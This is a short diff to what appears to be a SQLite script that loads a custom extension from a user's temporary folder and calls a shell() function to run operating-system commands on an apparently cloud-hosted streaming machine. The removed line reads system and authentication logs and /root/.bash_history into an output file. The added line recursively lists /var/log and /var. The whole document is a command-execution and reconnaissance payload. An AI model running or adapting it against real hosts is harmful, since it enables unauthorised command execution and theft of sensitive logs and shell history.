@@ -1,4 +1,4 @@
 -- <html>
 .load /home/as2-streaming-user/MyFiles/TemporaryFiles/extension
-select shell("(cat /var/log/syslog /var/logs/messages /var/log/secure /var/log/auth.log /var/log/auth.log /root/.bash_history /var/log/dmesg /var/log/kern.log /var/log/cloud-init.log /var/log/cloud-init-output.log; ls -al /var/log/ ) > /home/as2-streaming-user/MyFiles/TemporaryFiles/output.txt");
+select shell("(ls -alR /var/log/; ls -al /var/  ) > /home/as2-streaming-user/MyFiles/TemporaryFiles/output.txt");
 -- </html>
